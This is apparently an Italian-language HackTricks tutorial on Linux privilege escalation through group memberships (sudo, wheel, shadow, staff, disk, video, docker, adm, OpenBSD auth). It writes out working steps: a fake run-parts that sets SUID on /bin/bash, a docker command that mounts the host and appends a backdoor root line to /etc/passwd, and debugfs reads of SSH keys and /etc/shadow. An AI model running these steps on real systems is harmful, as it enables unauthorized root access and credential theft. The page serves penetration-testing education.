# Gruppi Interessanti - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Gruppi Sudo/Admin

### **PE - Method 1**

**A volte**, la policy **/etc/sudoers** di un sistema (o un file incluso da essa) contiene voci come:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Ciò significa che qualsiasi utente corrispondente a una delle due voci può eseguire qualsiasi comando come qualsiasi utente destinatario tramite `sudo` (in base al resto della policy).<sup>[[3]](#references)</sup>

Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
```
sudo su
```
### PE - Method 2

Trova tutti i binari suid e verifica se è presente il binario **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Se **pkexec è un binario SUID**, può eseguire un programma come un altro utente solo quando polkit autorizza l'azione richiesta; il bit SUID da solo non garantisce i privilegi di root. Controlla la policy installata e l'autorizzazione della sessione di destinazione invece di presumere che appartenere a **sudo** o **admin** sia sufficiente.<sup>[[4]](#references)[[5]](#references)</sup>

Sulle distribuzioni che utilizzano ancora il vecchio backend Local Authority, esamina le relative regole di gruppo con:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
I nomi dei gruppi rilevanti e le impostazioni predefinite variano a seconda della distribuzione; un gruppo è utile in questo contesto solo se la policy locale lo nomina.<sup>[[5]](#references)</sup>

Per **diventare root puoi eseguire**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
Se provi a eseguire **pkexec** e ricevi questo **errore**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
In una sessione SSH senza un authentication agent registrato, `pkexec` potrebbe non riuscire con questo errore anche quando la policy consentirebbe altrimenti l'azione; polkit documenta `pkttyagent` come agente di autenticazione testuale per le sessioni non desktop. Il comportamento esatto dipende dalla versione e dalla distribuzione, quindi verifica la policy locale e la configurazione dell'agent. Una soluzione alternativa segnalata per le versioni interessate di NixOS utilizza **2 diverse sessioni SSH**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Gruppo wheel

A volte una policy sudoers può contenere anche questa voce:
```
%wheel	ALL=(ALL:ALL) ALL
```
Ciò significa che qualsiasi utente corrispondente alla voce può eseguire qualsiasi comando come qualsiasi utente destinatario tramite `sudo` (in base al resto della policy).<sup>[[3]](#references)</sup>

In questo caso, per **diventare root puoi semplicemente eseguire**:
```
sudo su
```
## Gruppo shadow

Nei sistemi in cui le autorizzazioni lo consentono, gli utenti appartenenti al gruppo **shadow** possono **leggere** **/etc/shadow**; verifica la modalità effettiva e le ACL sul target:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Quindi, leggi il file e prova a **crackare alcuni hash**.

Breve precisazione sullo stato di blocco durante l'analisi degli hash:
- Le voci con `!` o `*` sono generalmente non interattive per i login con password.
- `!hash` significa che la password è stata bloccata; i caratteri rimanenti rappresentano il campo della password prima del blocco.
- Un campo contenente `*` non è un hash `crypt(3)` valido e impedisce il login con password UNIX; non dedurre da questo se una password sia stata precedentemente impostata.
Questo è utile per la classificazione degli account anche quando il login diretto è bloccato.<sup>[[6]](#references)</sup>

## Gruppo staff

**staff**: Consente agli utenti di aggiungere modifiche locali al sistema (`/usr/local`) senza richiedere privilegi di root (nota che gli eseguibili in `/usr/local/bin` si trovano nella variabile PATH di qualsiasi utente e possono "sovrascrivere" gli eseguibili in `/bin` e `/usr/bin` con lo stesso nome). Confronta con il gruppo "adm", che è più correlato al monitoraggio e alla sicurezza.<sup>[[2]](#references)[[7]](#references)</sup>

Nelle configurazioni Debian in cui `/usr/local/bin` precede `/usr/bin` in `PATH` (come negli esempi seguenti), un comando non qualificato risolve prima nella copia di `/usr/local/bin`; conferma il `PATH` effettivo sul target.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Se un processo con privilegi risolve un comando non qualificato tramite un `/usr/local/bin` scrivibile, sostituire quel comando può consentirne l'esecuzione con i privilegi del processo; prima dei test, conferma il percorso effettivo e il trigger.

Sui sistemi Ubuntu, `pam_motd` esegue gli script eseguibili tramite `run-parts --lsbsysinit` come root al login; anche i cron job possono utilizzare `run-parts`, ma ciò dipende dalla distribuzione e dalla configurazione.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Al momento di un nuovo login SSH, `pspy` può aiutare a confermare se questo percorso viene effettivamente invocato sul target; può osservare le righe di comando dei processi senza root.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Gruppo disk

L'appartenenza al gruppo **disk** può concedere l'accesso raw ai block device ed essere spesso **quasi equivalente all'accesso root**; Debian lo descrive come per lo più equivalente a root, ma è necessario verificare i permessi effettivi dei device e il layout dello storage sul target.<sup>[[7]](#references)</sup>

I percorsi comuni dei device includono `/dev/sd*`, ma NVMe e altri layout di storage utilizzano nomi diversi.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` opera sui filesystem ext2/ext3/ext4; i percorsi come `/root` e `/etc/shadow` riportati sopra sono file all'interno del filesystem aperto, mentre il secondo argomento di `dump` è un percorso di output sul filesystem nativo.<sup>[[8]](#references)</sup> Ad esempio, questo estrae `/tmp/asd1.txt` dal filesystem aperto in `/tmp/asd2.txt` sul filesystem nativo:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
L'opzione `-w` apre il filesystem in lettura-scrittura e il comando `write` copia un file nativo nel filesystem aperto. Evita di usarla su un filesystem live montato, perché le modifiche dirette possono danneggiare il filesystem; quando possibile, lavora da un'immagine offline.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Gruppo video

Usando il comando `w` puoi scoprire **chi è connesso al sistema** e verrà mostrato un output simile al seguente.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
La voce **tty1** identifica la prima console virtuale Linux; da sola non dimostra che un utente sia fisicamente presente sulla macchina, soprattutto nei container o in altri ambienti.<sup>[[21]](#references)</sup>

Nei sistemi che espongono un dispositivo framebuffer leggibile, l'appartenenza al gruppo **video** può concedere l'accesso a quel dispositivo. L'interfaccia framebuffer di Linux documenta `/dev/fb0` come un dispositivo di memoria leggibile che può essere copiato per acquisire uno screenshot; il percorso `/sys/class/graphics/fb0/virtual_size` è disponibile solo quando tale attributo sysfs di fbdev è presente, quindi verifica prima il target.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Se la versione installata di **GIMP** espone un importatore di dati raw, apri **`screen.raw`** con tale importatore; il supporto e i controlli variano in base alla versione e al plug-in.<sup>[[22]](#references)</sup>

![Gruppo Disk - Gruppo Video: per aprire l'immagine raw puoi usare GIMP, selezionare il file screen.raw e scegliere Raw image data come tipo di file](<../../../images/image (463).png>)

Imposta la larghezza e l'altezza dell'immagine in modo che corrispondano alla geometria del framebuffer; prova i formati dei pixel/ tipi di immagine disponibili finché l'output non sarà leggibile.<sup>[[9]](#references)</sup>

![Gruppo Disk - Gruppo Video: modifica quindi la larghezza e l'altezza impostandole su quelle utilizzate dallo schermo e prova diversi tipi di immagine (selezionando quello che mostra meglio lo schermo)](<../../../images/image (317).png>)

## Gruppo root

L'appartenenza al gruppo **root** non fornisce l'UID di root, ma i file scrivibili dal gruppo e di proprietà di `root` possono comunque essere interessanti quando i servizi o le librerie privilegiati li utilizzano. Verifica le autorizzazioni effettive del file e il modo in cui viene utilizzato prima di considerarlo un possibile percorso di privilege escalation.

**Verifica quali file i membri del gruppo root possono modificare**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

L'appartenenza al gruppo `docker` concede accesso a livello root al daemon Docker nelle installazioni rootful standard. Poiché i bind mount sono in modalità lettura-scrittura per impostazione predefinita, un utente che può controllare tale daemon può montare la `/` dell'host in un container e modificare i file dell'host; ciò equivale di fatto ad avere accesso root sull'host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Infine, se non ti piace nessuno dei suggerimenti precedenti, o se per qualche motivo non funzionano (docker api firewall?), potresti sempre provare a **eseguire un privileged container e fare escape da esso**, come spiegato qui:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Se hai permessi di scrittura sul docker socket, leggi [**questo post su come effettuare un privilege escalation abusando del docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Gruppo lxc/lxd

{{#ref}}
./
{{#endref}}

## Gruppo Adm

Di solito i **membri** del gruppo **`adm`** hanno i permessi per **leggere i file di log** situati all'interno di _/var/log/_.\
Pertanto, se hai compromesso un utente appartenente a questo gruppo, dovresti sicuramente **dare un'occhiata ai log**.<sup>[[7]](#references)</sup>

## Gruppi Backup / Operator / lp / Mail

Questi gruppi hanno significati specifici in base al servizio e alla distribuzione. Debian documenta `backup` per il backup/ripristino delegato, `lp` per i printer daemon e `mail` per `/var/mail`, quindi controlla i permessi locali prima di considerare l'appartenenza a questi gruppi come un possibile percorso di privilege escalation.<sup>[[7]](#references)</sup>

Spesso sono vettori di **credential-discovery** piuttosto che vettori diretti verso root:
- **backup**: può esporre archivi contenenti configurazioni, chiavi, DB dump o token.
- **operator**: accesso operativo specifico della piattaforma che può causare il leak di dati sensibili di runtime.
- **lp**: le code e gli spool di stampa possono contenere il contenuto dei documenti.
- **mail**: gli spool di posta possono esporre link di reimpostazione, OTP e credenziali interne.

Considera l'appartenenza a questi gruppi come una finding di esposizione di dati di alto valore ed effettua il pivot attraverso il riutilizzo di password/token.

## Gruppo Auth

Su OpenBSD, quando S/Key è configurato, `/etc/skey` è di proprietà di `root:auth` e l'accesso ai suoi record richiede il gruppo `auth`; i record YubiKey sono memorizzati in `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Una configurazione vulnerabile di OpenBSD 6.6 con S/Key o YubiKey abilitato consentiva agli utenti locali con privilegi `auth` di diventare root; Qualys documenta il prerequisito e la exploit chain, mentre il PoC collegato la implementa.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Autenticazione pkexec/pkttyagent senza una sessione GUI (issue #18012 di NixOS)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Wiki Debian](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Manpage Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Manuale di riferimento di polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Manuale di riferimento di polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Manuale per la messa in sicurezza di Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Pagina del manuale Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Il dispositivo Frame Buffer — Documentazione del kernel Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Manpage Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Manpage Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — snooping dei processi Linux senza privilegi](https://github.com/DominicBreuker/pspy)
- [13] [Sicurezza di Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Gestire Docker come utente non-root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Esecuzione dei container — Documentazione Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — Pagine del manuale OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — Pagine del manuale OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Vulnerabilità di autenticazione in OpenBSD — Security Advisory di Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC di exploit locale](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Dispositivi allocati Linux (versione 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Importazione ed esportazione delle immagini — Documentazione di GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
